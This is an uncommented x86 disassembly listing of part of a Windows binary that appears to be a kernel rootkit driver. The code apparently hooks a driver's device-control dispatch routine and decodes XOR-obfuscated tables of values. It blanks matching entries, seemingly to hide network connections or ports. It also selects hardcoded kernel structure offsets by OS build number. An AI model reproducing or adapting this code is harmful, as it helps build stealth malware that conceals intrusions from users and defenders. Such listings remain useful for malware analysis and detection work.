  402c01:	ff 15 0c 60 40 00    	call   *0x40600c
  402c07:	5e                   	pop    %esi
  402c08:	8b e5                	mov    %ebp,%esp
  402c0a:	5d                   	pop    %ebp
  402c0b:	c2 04 00             	ret    $0x4
  402c0e:	cc                   	int3
  402c0f:	cc                   	int3
  402c10:	83 ec 20             	sub    $0x20,%esp
  402c13:	53                   	push   %ebx
  402c14:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  402c18:	55                   	push   %ebp
  402c19:	56                   	push   %esi
  402c1a:	57                   	push   %edi
  402c1b:	8b 7b 60             	mov    0x60(%ebx),%edi
  402c1e:	83 ef 24             	sub    $0x24,%edi
  402c21:	83 7b 18 00          	cmpl   $0x0,0x18(%ebx)
  402c25:	89 7c 24 14          	mov    %edi,0x14(%esp)
  402c29:	0f 8c c8 00 00 00    	jl     0x402cf7
  402c2f:	8b 73 3c             	mov    0x3c(%ebx),%esi
  402c32:	8b 46 18             	mov    0x18(%esi),%eax
  402c35:	50                   	push   %eax
  402c36:	ff 15 80 60 40 00    	call   *0x406080
  402c3c:	84 c0                	test   %al,%al
  402c3e:	0f 84 b3 00 00 00    	je     0x402cf7
  402c44:	83 7e 1c 38          	cmpl   $0x38,0x1c(%esi)
  402c48:	0f 85 a9 00 00 00    	jne    0x402cf7
  402c4e:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  402c52:	8b 55 0c             	mov    0xc(%ebp),%edx
  402c55:	8b 7e 28             	mov    0x28(%esi),%edi
  402c58:	8b 5e 18             	mov    0x18(%esi),%ebx
  402c5b:	8b 76 38             	mov    0x38(%esi),%esi
  402c5e:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402c62:	51                   	push   %ecx
  402c63:	52                   	push   %edx
  402c64:	ff 15 b4 60 40 00    	call   *0x4060b4
  402c6a:	85 f6                	test   %esi,%esi
  402c6c:	7e 74                	jle    0x402ce2
  402c6e:	8b 2d 70 89 40 00    	mov    0x408970,%ebp
  402c74:	89 74 24 10          	mov    %esi,0x10(%esp)
  402c78:	8b 35 dc 87 40 00    	mov    0x4087dc,%esi
  402c7e:	83 c3 1e             	add    $0x1e,%ebx
  402c81:	33 c0                	xor    %eax,%eax
  402c83:	85 f6                	test   %esi,%esi
  402c85:	76 17                	jbe    0x402c9e
  402c87:	8b 4b 02             	mov    0x2(%ebx),%ecx
  402c8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402c90:	3b 0c 85 e0 87 40 00 	cmp    0x4087e0(,%eax,4),%ecx
  402c97:	74 1e                	je     0x402cb7
  402c99:	40                   	inc    %eax
  402c9a:	3b c6                	cmp    %esi,%eax
  402c9c:	72 f2                	jb     0x402c90
  402c9e:	33 c0                	xor    %eax,%eax
  402ca0:	85 ed                	test   %ebp,%ebp
  402ca2:	76 2d                	jbe    0x402cd1
  402ca4:	0f b7 0b             	movzwl (%ebx),%ecx
  402ca7:	3b 0c 85 78 89 40 00 	cmp    0x408978(,%eax,4),%ecx
  402cae:	74 07                	je     0x402cb7
  402cb0:	40                   	inc    %eax
  402cb1:	3b c5                	cmp    %ebp,%eax
  402cb3:	72 f2                	jb     0x402ca7
  402cb5:	eb 1a                	jmp    0x402cd1
  402cb7:	6a 38                	push   $0x38
  402cb9:	8d 43 e2             	lea    -0x1e(%ebx),%eax
  402cbc:	6a 00                	push   $0x0
  402cbe:	50                   	push   %eax
  402cbf:	e8 b8 2d 00 00       	call   0x405a7c
  402cc4:	83 c4 0c             	add    $0xc,%esp
  402cc7:	33 c0                	xor    %eax,%eax
  402cc9:	89 07                	mov    %eax,(%edi)
  402ccb:	89 47 04             	mov    %eax,0x4(%edi)
  402cce:	89 47 08             	mov    %eax,0x8(%edi)
  402cd1:	83 c3 38             	add    $0x38,%ebx
  402cd4:	83 c7 0c             	add    $0xc,%edi
  402cd7:	83 6c 24 10 01       	subl   $0x1,0x10(%esp)
  402cdc:	75 a3                	jne    0x402c81
  402cde:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  402ce2:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402ce6:	51                   	push   %ecx
  402ce7:	ff 15 b0 60 40 00    	call   *0x4060b0
  402ced:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  402cf1:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402cf5:	eb 04                	jmp    0x402cfb
  402cf7:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  402cfb:	8b 55 04             	mov    0x4(%ebp),%edx
  402cfe:	89 57 20             	mov    %edx,0x20(%edi)
  402d01:	8b 45 00             	mov    0x0(%ebp),%eax
  402d04:	6a 00                	push   $0x0
  402d06:	55                   	push   %ebp
  402d07:	89 47 1c             	mov    %eax,0x1c(%edi)
  402d0a:	ff 15 28 61 40 00    	call   *0x406128
  402d10:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  402d14:	74 16                	je     0x402d2c
  402d16:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  402d1a:	8b 57 1c             	mov    0x1c(%edi),%edx
  402d1d:	55                   	push   %ebp
  402d1e:	53                   	push   %ebx
  402d1f:	51                   	push   %ecx
  402d20:	ff d2                	call   *%edx
  402d22:	5f                   	pop    %edi
  402d23:	5e                   	pop    %esi
  402d24:	5d                   	pop    %ebp
  402d25:	5b                   	pop    %ebx
  402d26:	83 c4 20             	add    $0x20,%esp
  402d29:	c2 0c 00             	ret    $0xc
  402d2c:	80 7b 21 00          	cmpb   $0x0,0x21(%ebx)
  402d30:	74 07                	je     0x402d39
  402d32:	8b 43 60             	mov    0x60(%ebx),%eax
  402d35:	80 48 03 01          	orb    $0x1,0x3(%eax)
  402d39:	5f                   	pop    %edi
  402d3a:	5e                   	pop    %esi
  402d3b:	5d                   	pop    %ebp
  402d3c:	33 c0                	xor    %eax,%eax
  402d3e:	5b                   	pop    %ebx
  402d3f:	83 c4 20             	add    $0x20,%esp
  402d42:	c2 0c 00             	ret    $0xc
  402d45:	cc                   	int3
  402d46:	cc                   	int3
  402d47:	cc                   	int3
  402d48:	cc                   	int3
  402d49:	cc                   	int3
  402d4a:	cc                   	int3
  402d4b:	cc                   	int3
  402d4c:	cc                   	int3
  402d4d:	cc                   	int3
  402d4e:	cc                   	int3
  402d4f:	cc                   	int3
  402d50:	53                   	push   %ebx
  402d51:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402d55:	56                   	push   %esi
  402d56:	8b 73 60             	mov    0x60(%ebx),%esi
  402d59:	81 7e 0c 1b 00 12 00 	cmpl   $0x12001b,0xc(%esi)
  402d60:	75 45                	jne    0x402da7
  402d62:	83 7e 08 3c          	cmpl   $0x3c,0x8(%esi)
  402d66:	75 3f                	jne    0x402da7
  402d68:	57                   	push   %edi
  402d69:	6a 34                	push   $0x34
  402d6b:	6a 00                	push   $0x0
  402d6d:	ff 15 2c 60 40 00    	call   *0x40602c
  402d73:	8b f8                	mov    %eax,%edi
  402d75:	8b 46 1c             	mov    0x1c(%esi),%eax
  402d78:	89 07                	mov    %eax,(%edi)
  402d7a:	8b 4e 20             	mov    0x20(%esi),%ecx
  402d7d:	89 4f 04             	mov    %ecx,0x4(%edi)
  402d80:	c7 46 1c 10 2c 40 00 	movl   $0x402c10,0x1c(%esi)
  402d87:	89 7e 20             	mov    %edi,0x20(%esi)
  402d8a:	ff 15 a8 60 40 00    	call   *0x4060a8
  402d90:	89 47 0c             	mov    %eax,0xc(%edi)
  402d93:	8a 56 03             	mov    0x3(%esi),%dl
  402d96:	80 e2 40             	and    $0x40,%dl
  402d99:	80 fa 40             	cmp    $0x40,%dl
  402d9c:	0f 94 c0             	sete   %al
  402d9f:	88 47 08             	mov    %al,0x8(%edi)
  402da2:	80 4e 03 40          	orb    $0x40,0x3(%esi)
  402da6:	5f                   	pop    %edi
  402da7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402dab:	53                   	push   %ebx
  402dac:	51                   	push   %ecx
  402dad:	ff 15 08 8b 40 00    	call   *0x408b08
  402db3:	5e                   	pop    %esi
  402db4:	5b                   	pop    %ebx
  402db5:	c2 08 00             	ret    $0x8
  402db8:	cc                   	int3
  402db9:	cc                   	int3
  402dba:	cc                   	int3
  402dbb:	cc                   	int3
  402dbc:	cc                   	int3
  402dbd:	cc                   	int3
  402dbe:	cc                   	int3
  402dbf:	cc                   	int3
  402dc0:	81 ec ac 09 00 00    	sub    $0x9ac,%esp
  402dc6:	53                   	push   %ebx
  402dc7:	55                   	push   %ebp
  402dc8:	56                   	push   %esi
  402dc9:	57                   	push   %edi
  402dca:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  402dcf:	be 60 63 40 00       	mov    $0x406360,%esi
  402dd4:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402dd8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402dda:	33 db                	xor    %ebx,%ebx
  402ddc:	8d 44 24 48          	lea    0x48(%esp),%eax
  402de0:	50                   	push   %eax
  402de1:	53                   	push   %ebx
  402de2:	88 5c 24 1f          	mov    %bl,0x1f(%esp)
  402de6:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  402de8:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402dec:	89 1d dc 87 40 00    	mov    %ebx,0x4087dc
  402df2:	89 1d 70 89 40 00    	mov    %ebx,0x408970
  402df8:	ff 15 9c 60 40 00    	call   *0x40609c
  402dfe:	85 c0                	test   %eax,%eax
  402e00:	0f 8c c7 01 00 00    	jl     0x402fcd
  402e06:	8b 2d 18 60 40 00    	mov    0x406018,%ebp
  402e0c:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402e10:	51                   	push   %ecx
  402e11:	8d 54 24 44          	lea    0x44(%esp),%edx
  402e15:	52                   	push   %edx
  402e16:	ff d5                	call   *%ebp
  402e18:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402e1c:	51                   	push   %ecx
  402e1d:	6a 01                	push   $0x1
  402e1f:	8d 54 24 20          	lea    0x20(%esp),%edx
  402e23:	8d 44 24 48          	lea    0x48(%esp),%eax
  402e27:	52                   	push   %edx
  402e28:	c7 44 24 34 18 00 00 	movl   $0x18,0x34(%esp)
  402e2f:	00 
  402e30:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  402e34:	c7 44 24 40 40 00 00 	movl   $0x40,0x40(%esp)
  402e3b:	00 
  402e3c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  402e40:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  402e44:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  402e48:	ff 15 ac 60 40 00    	call   *0x4060ac
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	0f 8c 77 01 00 00    	jl     0x402fcd
  402e56:	68 00 01 00 00       	push   $0x100
  402e5b:	8d 84 24 bc 00 00 00 	lea    0xbc(%esp),%eax
  402e62:	53                   	push   %ebx
  402e63:	50                   	push   %eax
  402e64:	e8 13 2c 00 00       	call   0x405a7c
  402e69:	68 00 08 00 00       	push   $0x800
  402e6e:	8d 8c 24 c8 01 00 00 	lea    0x1c8(%esp),%ecx
  402e75:	53                   	push   %ebx
  402e76:	51                   	push   %ecx
  402e77:	e8 00 2c 00 00       	call   0x405a7c
  402e7c:	68 cc 63 40 00       	push   $0x4063cc
  402e81:	b8 00 01 00 00       	mov    $0x100,%eax
  402e86:	8d 9c 24 d4 00 00 00 	lea    0xd4(%esp),%ebx
  402e8d:	e8 6e e1 ff ff       	call   0x401000
  402e92:	83 c4 1c             	add    $0x1c,%esp
  402e95:	8b d3                	mov    %ebx,%edx
  402e97:	52                   	push   %edx
  402e98:	8d 44 24 24          	lea    0x24(%esp),%eax
  402e9c:	50                   	push   %eax
  402e9d:	ff d5                	call   *%ebp
  402e9f:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402ea3:	51                   	push   %ecx
  402ea4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402ea8:	68 00 10 00 00       	push   $0x1000
  402ead:	8d 94 24 c0 01 00 00 	lea    0x1c0(%esp),%edx
  402eb4:	52                   	push   %edx
  402eb5:	6a 02                	push   $0x2
  402eb7:	8d 44 24 30          	lea    0x30(%esp),%eax
  402ebb:	50                   	push   %eax
  402ebc:	51                   	push   %ecx
  402ebd:	ff 15 a4 60 40 00    	call   *0x4060a4
  402ec3:	85 c0                	test   %eax,%eax
  402ec5:	0f 8c 00 01 00 00    	jl     0x402fcb
  402ecb:	33 f6                	xor    %esi,%esi
  402ecd:	8d 49 00             	lea    0x0(%ecx),%ecx
  402ed0:	8d 7e 01             	lea    0x1(%esi),%edi
  402ed3:	57                   	push   %edi
  402ed4:	68 d4 63 40 00       	push   $0x4063d4
  402ed9:	b8 00 01 00 00       	mov    $0x100,%eax
  402ede:	8d 9c 24 c0 00 00 00 	lea    0xc0(%esp),%ebx
  402ee5:	e8 16 e1 ff ff       	call   0x401000
  402eea:	83 c4 08             	add    $0x8,%esp
  402eed:	8b d3                	mov    %ebx,%edx
  402eef:	52                   	push   %edx
  402ef0:	8d 44 24 24          	lea    0x24(%esp),%eax
  402ef4:	50                   	push   %eax
  402ef5:	ff d5                	call   *%ebp
  402ef7:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402efb:	51                   	push   %ecx
  402efc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402f00:	68 00 10 00 00       	push   $0x1000
  402f05:	8d 94 24 c0 01 00 00 	lea    0x1c0(%esp),%edx
  402f0c:	52                   	push   %edx
  402f0d:	6a 02                	push   $0x2
  402f0f:	8d 44 24 30          	lea    0x30(%esp),%eax
  402f13:	50                   	push   %eax
  402f14:	51                   	push   %ecx
  402f15:	ff 15 a4 60 40 00    	call   *0x4060a4
  402f1b:	85 c0                	test   %eax,%eax
  402f1d:	7c 2a                	jl     0x402f49
  402f1f:	8b 94 24 c4 01 00 00 	mov    0x1c4(%esp),%edx
  402f26:	81 f2 b7 61 2d ae    	xor    $0xae2d61b7,%edx
  402f2c:	b8 01 00 00 00       	mov    $0x1,%eax
  402f31:	01 05 dc 87 40 00    	add    %eax,0x4087dc
  402f37:	89 14 b5 e0 87 40 00 	mov    %edx,0x4087e0(,%esi,4)
  402f3e:	8b f7                	mov    %edi,%esi
  402f40:	83 fe 64             	cmp    $0x64,%esi
  402f43:	88 44 24 17          	mov    %al,0x17(%esp)
  402f47:	7c 87                	jl     0x402ed0
  402f49:	33 f6                	xor    %esi,%esi
  402f4b:	eb 03                	jmp    0x402f50
  402f4d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402f50:	8d 7e 01             	lea    0x1(%esi),%edi
  402f53:	57                   	push   %edi
  402f54:	68 e0 63 40 00       	push   $0x4063e0
  402f59:	b8 00 01 00 00       	mov    $0x100,%eax
  402f5e:	8d 9c 24 c0 00 00 00 	lea    0xc0(%esp),%ebx
  402f65:	e8 96 e0 ff ff       	call   0x401000
  402f6a:	83 c4 08             	add    $0x8,%esp
  402f6d:	8b c3                	mov    %ebx,%eax
  402f6f:	50                   	push   %eax
  402f70:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402f74:	51                   	push   %ecx
  402f75:	ff d5                	call   *%ebp
  402f77:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402f7b:	52                   	push   %edx
  402f7c:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402f80:	68 00 10 00 00       	push   $0x1000
  402f85:	8d 84 24 c0 01 00 00 	lea    0x1c0(%esp),%eax
  402f8c:	50                   	push   %eax
  402f8d:	6a 02                	push   $0x2
  402f8f:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402f93:	51                   	push   %ecx
  402f94:	52                   	push   %edx
  402f95:	ff 15 a4 60 40 00    	call   *0x4060a4
  402f9b:	85 c0                	test   %eax,%eax
  402f9d:	7c 2c                	jl     0x402fcb
  402f9f:	66 8b 84 24 c4 01 00 	mov    0x1c4(%esp),%ax
  402fa6:	00 
  402fa7:	66 c1 c0 08          	rol    $0x8,%ax
  402fab:	0f b7 c8             	movzwl %ax,%ecx
  402fae:	b8 01 00 00 00       	mov    $0x1,%eax
  402fb3:	01 05 70 89 40 00    	add    %eax,0x408970
  402fb9:	89 0c b5 78 89 40 00 	mov    %ecx,0x408978(,%esi,4)
  402fc0:	8b f7                	mov    %edi,%esi
  402fc2:	83 fe 64             	cmp    $0x64,%esi
  402fc5:	88 44 24 17          	mov    %al,0x17(%esp)
  402fc9:	7c 85                	jl     0x402f50
  402fcb:	33 db                	xor    %ebx,%ebx
  402fcd:	8b 44 24 18          	mov    0x18(%esp),%eax
  402fd1:	3b c3                	cmp    %ebx,%eax
  402fd3:	74 07                	je     0x402fdc
  402fd5:	50                   	push   %eax
  402fd6:	ff 15 14 60 40 00    	call   *0x406014
  402fdc:	33 c0                	xor    %eax,%eax
  402fde:	38 5c 24 17          	cmp    %bl,0x17(%esp)
  402fe2:	5f                   	pop    %edi
  402fe3:	0f 95 c0             	setne  %al
  402fe6:	5e                   	pop    %esi
  402fe7:	5d                   	pop    %ebp
  402fe8:	5b                   	pop    %ebx
  402fe9:	48                   	dec    %eax
  402fea:	25 01 00 00 c0       	and    $0xc0000001,%eax
  402fef:	81 c4 ac 09 00 00    	add    $0x9ac,%esp
  402ff5:	c3                   	ret
  402ff6:	cc                   	int3
  402ff7:	cc                   	int3
  402ff8:	cc                   	int3
  402ff9:	cc                   	int3
  402ffa:	cc                   	int3
  402ffb:	cc                   	int3
  402ffc:	cc                   	int3
  402ffd:	cc                   	int3
  402ffe:	cc                   	int3
  402fff:	cc                   	int3
  403000:	55                   	push   %ebp
  403001:	8b ec                	mov    %esp,%ebp
  403003:	83 e4 f8             	and    $0xfffffff8,%esp
  403006:	83 ec 14             	sub    $0x14,%esp
  403009:	56                   	push   %esi
  40300a:	c7 44 24 10 80 0f 05 	movl   $0xfd050f80,0x10(%esp)
  403011:	fd 
  403012:	c7 44 24 14 ff ff ff 	movl   $0xffffffff,0x14(%esp)
  403019:	ff 
  40301a:	e8 a1 fd ff ff       	call   0x402dc0
  40301f:	85 c0                	test   %eax,%eax
  403021:	7d 21                	jge    0x403044
  403023:	8b 35 a0 60 40 00    	mov    0x4060a0,%esi
  403029:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403030:	8d 44 24 10          	lea    0x10(%esp),%eax
  403034:	50                   	push   %eax
  403035:	6a 00                	push   $0x0
  403037:	6a 00                	push   $0x0
  403039:	ff d6                	call   *%esi
  40303b:	e8 80 fd ff ff       	call   0x402dc0
  403040:	85 c0                	test   %eax,%eax
  403042:	7c ec                	jl     0x403030
  403044:	8b 35 18 60 40 00    	mov    0x406018,%esi
  40304a:	68 20 64 40 00       	push   $0x406420
  40304f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403053:	51                   	push   %ecx
  403054:	ff d6                	call   *%esi
  403056:	8b 15 6c 60 40 00    	mov    0x40606c,%edx
  40305c:	8b 02                	mov    (%edx),%eax
  40305e:	68 74 89 40 00       	push   $0x408974
  403063:	6a 00                	push   $0x0
  403065:	6a 00                	push   $0x0
  403067:	50                   	push   %eax
  403068:	6a 00                	push   $0x0
  40306a:	6a 00                	push   $0x0
  40306c:	6a 40                	push   $0x40
  40306e:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  403072:	51                   	push   %ecx
  403073:	e8 f2 29 00 00       	call   0x405a6a
  403078:	85 c0                	test   %eax,%eax
  40307a:	7d 3b                	jge    0x4030b7
  40307c:	68 44 64 40 00       	push   $0x406444
  403081:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403085:	52                   	push   %edx
  403086:	ff d6                	call   *%esi
  403088:	68 10 8b 40 00       	push   $0x408b10
  40308d:	68 0c 8b 40 00       	push   $0x408b0c
  403092:	68 ff 01 1f 00       	push   $0x1f01ff
  403097:	8d 44 24 14          	lea    0x14(%esp),%eax
  40309b:	50                   	push   %eax
  40309c:	ff 15 70 60 40 00    	call   *0x406070
  4030a2:	85 c0                	test   %eax,%eax
  4030a4:	7c 31                	jl     0x4030d7
  4030a6:	8b 0d 0c 8b 40 00    	mov    0x408b0c,%ecx
  4030ac:	8b 51 04             	mov    0x4(%ecx),%edx
  4030af:	8b 42 08             	mov    0x8(%edx),%eax
  4030b2:	a3 74 89 40 00       	mov    %eax,0x408974
  4030b7:	a1 74 89 40 00       	mov    0x408974,%eax
  4030bc:	8b 48 70             	mov    0x70(%eax),%ecx
  4030bf:	83 c0 70             	add    $0x70,%eax
  4030c2:	89 0d 08 8b 40 00    	mov    %ecx,0x408b08
  4030c8:	ba 50 2d 40 00       	mov    $0x402d50,%edx
  4030cd:	87 10                	xchg   %edx,(%eax)
  4030cf:	6a 00                	push   $0x0
  4030d1:	ff 15 0c 60 40 00    	call   *0x40600c
  4030d7:	5e                   	pop    %esi
  4030d8:	8b e5                	mov    %ebp,%esp
  4030da:	5d                   	pop    %ebp
  4030db:	c2 04 00             	ret    $0x4
  4030de:	cc                   	int3
  4030df:	cc                   	int3
  4030e0:	83 ec 08             	sub    $0x8,%esp
  4030e3:	53                   	push   %ebx
  4030e4:	56                   	push   %esi
  4030e5:	57                   	push   %edi
  4030e6:	8b 3d bc 60 40 00    	mov    0x4060bc,%edi
  4030ec:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4030f0:	50                   	push   %eax
  4030f1:	33 db                	xor    %ebx,%ebx
  4030f3:	53                   	push   %ebx
  4030f4:	8b c8                	mov    %eax,%ecx
  4030f6:	51                   	push   %ecx
  4030f7:	6a 0b                	push   $0xb
  4030f9:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4030fd:	ff d7                	call   *%edi
  4030ff:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403103:	52                   	push   %edx
  403104:	53                   	push   %ebx
  403105:	ff 15 2c 60 40 00    	call   *0x40602c
  40310b:	8b f0                	mov    %eax,%esi
  40310d:	3b f3                	cmp    %ebx,%esi
  40310f:	74 17                	je     0x403128
  403111:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403115:	53                   	push   %ebx
  403116:	50                   	push   %eax
  403117:	56                   	push   %esi
  403118:	6a 0b                	push   $0xb
  40311a:	ff d7                	call   *%edi
  40311c:	85 c0                	test   %eax,%eax
  40311e:	7d 13                	jge    0x403133
  403120:	53                   	push   %ebx
  403121:	56                   	push   %esi
  403122:	ff 15 28 61 40 00    	call   *0x406128
  403128:	5f                   	pop    %edi
  403129:	5e                   	pop    %esi
  40312a:	33 c0                	xor    %eax,%eax
  40312c:	5b                   	pop    %ebx
  40312d:	83 c4 08             	add    $0x8,%esp
  403130:	c2 08 00             	ret    $0x8
  403133:	33 ff                	xor    %edi,%edi
  403135:	39 1e                	cmp    %ebx,(%esi)
  403137:	76 51                	jbe    0x40318a
  403139:	55                   	push   %ebp
  40313a:	8d 6e 1e             	lea    0x1e(%esi),%ebp
  40313d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403140:	0f b7 55 00          	movzwl 0x0(%ebp),%edx
  403144:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403148:	03 d3                	add    %ebx,%edx
  40314a:	51                   	push   %ecx
  40314b:	8d 44 32 20          	lea    0x20(%edx,%esi,1),%eax
  40314f:	50                   	push   %eax
  403150:	e8 21 29 00 00       	call   0x405a76
  403155:	83 c4 08             	add    $0x8,%esp
  403158:	85 c0                	test   %eax,%eax
  40315a:	74 13                	je     0x40316f
  40315c:	47                   	inc    %edi
  40315d:	81 c3 1c 01 00 00    	add    $0x11c,%ebx
  403163:	81 c5 1c 01 00 00    	add    $0x11c,%ebp
  403169:	3b 3e                	cmp    (%esi),%edi
  40316b:	72 d3                	jb     0x403140
  40316d:	eb 1a                	jmp    0x403189
  40316f:	8b 44 24 20          	mov    0x20(%esp),%eax
  403173:	69 ff 1c 01 00 00    	imul   $0x11c,%edi,%edi
  403179:	8b 4c 37 0c          	mov    0xc(%edi,%esi,1),%ecx
  40317d:	8b 54 37 10          	mov    0x10(%edi,%esi,1),%edx
  403181:	03 fe                	add    %esi,%edi
  403183:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403187:	89 10                	mov    %edx,(%eax)
  403189:	5d                   	pop    %ebp
  40318a:	6a 00                	push   $0x0
  40318c:	56                   	push   %esi
  40318d:	ff 15 28 61 40 00    	call   *0x406128
  403193:	8b 44 24 10          	mov    0x10(%esp),%eax
  403197:	5f                   	pop    %edi
  403198:	5e                   	pop    %esi
  403199:	5b                   	pop    %ebx
  40319a:	83 c4 08             	add    $0x8,%esp
  40319d:	c2 08 00             	ret    $0x8
  4031a0:	83 ec 0c             	sub    $0xc,%esp
  4031a3:	8b 46 3c             	mov    0x3c(%esi),%eax
  4031a6:	53                   	push   %ebx
  4031a7:	8b 5c 30 78          	mov    0x78(%eax,%esi,1),%ebx
  4031ab:	03 c6                	add    %esi,%eax
  4031ad:	8b 40 7c             	mov    0x7c(%eax),%eax
  4031b0:	57                   	push   %edi
  4031b1:	33 ff                	xor    %edi,%edi
  4031b3:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4031b7:	89 44 24 10          	mov    %eax,0x10(%esp)
  4031bb:	39 7c 33 18          	cmp    %edi,0x18(%ebx,%esi,1)
  4031bf:	76 35                	jbe    0x4031f6
  4031c1:	8b 54 33 20          	mov    0x20(%ebx,%esi,1),%edx
  4031c5:	8d 0c be             	lea    (%esi,%edi,4),%ecx
  4031c8:	8b 04 11             	mov    (%ecx,%edx,1),%eax
  4031cb:	8b 4c 33 24          	mov    0x24(%ebx,%esi,1),%ecx
  4031cf:	8d 14 79             	lea    (%ecx,%edi,2),%edx
  4031d2:	66 8b 0c 32          	mov    (%edx,%esi,1),%cx
  4031d6:	03 c6                	add    %esi,%eax
  4031d8:	68 8c 64 40 00       	push   $0x40648c
  4031dd:	50                   	push   %eax
  4031de:	66 89 4c 24 10       	mov    %cx,0x10(%esp)
  4031e3:	e8 8e 28 00 00       	call   0x405a76
  4031e8:	83 c4 08             	add    $0x8,%esp
  4031eb:	85 c0                	test   %eax,%eax
  4031ed:	74 0f                	je     0x4031fe
  4031ef:	47                   	inc    %edi
  4031f0:	3b 7c 33 18          	cmp    0x18(%ebx,%esi,1),%edi
  4031f4:	72 cb                	jb     0x4031c1
  4031f6:	33 c0                	xor    %eax,%eax
  4031f8:	5f                   	pop    %edi
  4031f9:	5b                   	pop    %ebx
  4031fa:	83 c4 0c             	add    $0xc,%esp
  4031fd:	c3                   	ret
  4031fe:	8b 54 33 1c          	mov    0x1c(%ebx,%esi,1),%edx
  403202:	8b 44 24 08          	mov    0x8(%esp),%eax
  403206:	8d 0c 82             	lea    (%edx,%eax,4),%ecx
  403209:	8b 04 31             	mov    (%ecx,%esi,1),%eax
  40320c:	5f                   	pop    %edi
  40320d:	03 c6                	add    %esi,%eax
  40320f:	5b                   	pop    %ebx
  403210:	83 c4 0c             	add    $0xc,%esp
  403213:	c3                   	ret
  403214:	cc                   	int3
  403215:	cc                   	int3
  403216:	cc                   	int3
  403217:	cc                   	int3
  403218:	cc                   	int3
  403219:	cc                   	int3
  40321a:	cc                   	int3
  40321b:	cc                   	int3
  40321c:	cc                   	int3
  40321d:	cc                   	int3
  40321e:	cc                   	int3
  40321f:	cc                   	int3
  403220:	83 ec 0c             	sub    $0xc,%esp
  403223:	53                   	push   %ebx
  403224:	57                   	push   %edi
  403225:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403229:	50                   	push   %eax
  40322a:	8d 5c 24 0c          	lea    0xc(%esp),%ebx
  40322e:	8d 7c 24 14          	lea    0x14(%esp),%edi
  403232:	e8 39 27 00 00       	call   0x405970
  403237:	85 c0                	test   %eax,%eax
  403239:	0f 8c 0b 03 00 00    	jl     0x40354a
  40323f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403243:	81 f9 28 0a 00 00    	cmp    $0xa28,%ecx
  403249:	75 3e                	jne    0x403289
  40324b:	83 7c 24 08 05       	cmpl   $0x5,0x8(%esp)
  403250:	0f 85 ef 02 00 00    	jne    0x403545
  403256:	83 7c 24 0c 01       	cmpl   $0x1,0xc(%esp)
  40325b:	0f 85 e4 02 00 00    	jne    0x403545
  403261:	c7 06 84 00 00 00    	movl   $0x84,(%esi)
  403267:	c7 46 04 88 00 00 00 	movl   $0x88,0x4(%esi)
  40326e:	c7 46 08 74 01 00 00 	movl   $0x174,0x8(%esi)
  403275:	c7 46 0c f4 01 00 00 	movl   $0x1f4,0xc(%esi)
  40327c:	c7 46 10 38 01 00 00 	movl   $0x138,0x10(%esi)
  403283:	5f                   	pop    %edi
  403284:	5b                   	pop    %ebx
  403285:	83 c4 0c             	add    $0xc,%esp
  403288:	c3                   	ret
  403289:	81 f9 ce 0e 00 00    	cmp    $0xece,%ecx
  40328f:	75 3e                	jne    0x4032cf
  403291:	83 7c 24 08 05       	cmpl   $0x5,0x8(%esp)
  403296:	0f 85 a9 02 00 00    	jne    0x403545
  40329c:	83 7c 24 0c 02       	cmpl   $0x2,0xc(%esp)
  4032a1:	0f 85 9e 02 00 00    	jne    0x403545
  4032a7:	c7 06 94 00 00 00    	movl   $0x94,(%esi)
  4032ad:	c7 46 04 98 00 00 00 	movl   $0x98,0x4(%esi)
  4032b4:	c7 46 08 64 01 00 00 	movl   $0x164,0x8(%esi)
  4032bb:	c7 46 0c e4 01 00 00 	movl   $0x1e4,0xc(%esi)
  4032c2:	c7 46 10 24 01 00 00 	movl   $0x124,0x10(%esi)
  4032c9:	5f                   	pop    %edi
  4032ca:	5b                   	pop    %ebx
  4032cb:	83 c4 0c             	add    $0xc,%esp
  4032ce:	c3                   	ret
  4032cf:	81 f9 70 17 00 00    	cmp    $0x1770,%ecx
  4032d5:	74 10                	je     0x4032e7
